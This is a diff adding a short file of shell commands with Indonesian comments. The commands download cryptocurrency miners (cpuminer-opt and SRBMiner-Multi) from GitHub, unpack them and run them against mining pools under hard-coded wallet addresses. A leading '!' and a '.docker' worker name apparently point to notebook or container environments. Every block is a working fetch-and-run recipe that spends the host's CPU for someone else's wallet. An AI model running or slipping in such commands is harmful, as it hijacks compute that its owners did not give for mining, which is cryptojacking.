@@ -1,0 +1,17 @@
+! wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescryptr32 -o stratum+tcps://stratum-eu.rplant.xyz:17047 -u DA9RJ27qCLvMn7TUQSCNAmhx1xFZ2L868Q.docker -t 0
+
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && ./SRBMiner-MULTI --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
+
+agam saja:
+# Donwload file
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz
+
+# extrak file
+tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz
+
+# buka
+cd SRBMiner-Multi-0-6-6
+
+# jalan
+./SRBMiner-MULTI --algorithm randomx --pool fi.qrl.herominers.com:10370 --wallet Q0105008e419baff3fcde4a8ba2df0029be536a3b7b488f3cc9902f47c9517625890f0746bdf842.p1 --disable-gpu --cpu-threads 16
